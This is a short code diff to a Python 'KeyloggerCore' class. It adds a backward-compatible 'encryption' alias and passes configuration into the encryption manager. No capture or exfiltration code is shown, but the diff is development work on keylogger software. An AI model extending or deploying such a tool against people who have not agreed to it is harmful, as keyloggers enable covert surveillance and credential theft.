@@ -70,6 +70,7 @@ class KeyloggerCore:
         # Core components
         # self.config_manager may have been injected above
         self.encryption_manager = None
+        self.encryption = None  # Backward-compat alias used by some components
         self.logging_manager = None
         
         # Listeners / Utilities
@@ -131,9 +132,12 @@ class KeyloggerCore:
             self.config = self.config_manager
             
             # Initialize encryption manager
-            self.encryption_manager = EncryptionManager()
+            self.encryption_manager = EncryptionManager(self.config_manager)
             if not getattr(self.encryption_manager, 'init_encryption', lambda: True)():
                 logger.warning("Encryption manager initialization failed, continuing without encryption")
+            
+            # Backward-compat alias for components expecting `self.encryption`
+            self.encryption = self.encryption_manager
             
             # Initialize logging manager
             self.logging_manager = LoggingManager(self.config_manager, self.encryption_manager)
